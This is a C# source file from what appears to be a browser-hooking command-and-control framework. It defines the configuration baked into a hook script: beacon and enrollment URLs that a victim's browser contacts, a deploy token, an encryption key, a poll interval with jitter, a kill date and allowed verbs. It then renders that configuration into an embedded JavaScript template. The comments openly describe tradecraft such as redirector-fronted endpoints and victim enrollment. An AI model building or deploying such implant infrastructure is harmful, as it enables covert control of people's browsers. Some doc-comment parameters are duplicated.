using System.Reflection;
using System.Text;
using System.Text.Json;

namespace Rod.Transport.Hooks;

/// <summary>
/// The bake a hook mint renders into the served script: where the hooked
/// browser contacts, the credential it redeems, the seal it carries, the
/// cadence it polls at, and the verbs it may run. Everything the hook knows
/// about its deployment lives in the bake -- the template itself is
/// deployment-free.
/// </summary>
/// <param name="EnrollUrl">
/// The enroll route on the listener's public endpoint, what a victim's
/// browser can reach (the redirector-fronted edge, not the bind).
/// </param>
/// <param name="BeaconUrl">The envelope contact route on the same endpoint.</param>
/// <param name="TokenSecret">
/// The deploy token the mint baked; each hooked browser's enrollment spends
/// one use of it, so the mint's budget is the enrollment budget.
/// </param>
/// <param name="BakedKey">
/// The packed envelope key (<c>base64(keyId || key)</c>, the
/// <see cref="Payloads.AesGcmEnvelope.Bake"/> form) in the sealed posture;
/// null in the cleartext posture, where nothing seals and nothing keys.
/// </param>
/// <param name="Verbs">The Browser class's reduced verb set.</param>
/// <param name="JitterSeconds">The jitter half-width around the interval.</param>
/// <param name="Verbs">The Browser class's reduced verb set.</param>
/// <param name="SleepSeconds">The poll cadence's base interval.</param>
/// <param name="JitterSeconds">The jitter half-width around the interval.</param>
/// <param name="KillDate">
/// The baked time fuse as RFC 3339, or null on an open-ended mint.
/// </param>
public sealed record BrowserHookBake(
    string EnrollUrl,
    string BeaconUrl,
    string TokenSecret,
    string? BakedKey,
    IReadOnlyCollection<string> Verbs,
    double SleepSeconds,
    double JitterSeconds,
    string? KillDate);

/// <summary>
/// Renders the browser hook script (architecture.md Sec 5.2, Sec 8): the
/// in-tree template with one bake substituted. The template is an embedded
/// resource of this assembly -- dependency-free vanilla JavaScript the
/// served artifact copies verbatim except for the single bake object, so a
/// served hook is reviewable as "the template plus this bake" and nothing
/// else.
/// </summary>
public static class BrowserHookScript
{
    private const string ResourceName = "Rod.Transport.Hooks.hook.template.js";
    private const string Placeholder = "__ROD_BAKE_JSON__";

    private static readonly Lazy<string> Template = new(() =>
    {
        var assembly = Assembly.GetExecutingAssembly();
        using var stream = assembly.GetManifestResourceStream(ResourceName)
            ?? throw new InvalidOperationException($"The embedded hook template '{ResourceName}' is missing from the build.");
        using var reader = new StreamReader(stream, Encoding.UTF8);
        return reader.ReadToEnd();
    });

    private static readonly JsonSerializerOptions BakeJson = new()
    {
        // The template reads camelCase keys (enrollUrl, beaconUrl, ...) --
        // the shape every wire-side JSON document in the codebase carries.
        PropertyNamingPolicy = JsonNamingPolicy.CamelCase,
    };

    /// <summary>
    /// Renders the hook for <paramref name="bake"/>. The substitution is a
    /// single placeholder the template defines exactly once, so a render is
    /// total: a template edit that loses the placeholder fails here rather
    /// than serving an unconfigured hook.
    /// </summary>
    public static byte[] Render(BrowserHookBake bake)
    {
        var template = Template.Value;
        if (!template.Contains(Placeholder))
            throw new InvalidOperationException("The hook template no longer carries its bake placeholder.");

        var json = JsonSerializer.Serialize(
            new
            {
                bake.EnrollUrl,
                bake.BeaconUrl,
                token = bake.TokenSecret,
                bakedKey = bake.BakedKey,
                bake.Verbs,
                sleep = bake.SleepSeconds,
                jitter = bake.JitterSeconds,
                killDate = bake.KillDate,
            },
            BakeJson);

        return Encoding.UTF8.GetBytes(template.Replace(Placeholder, json));
    }
}
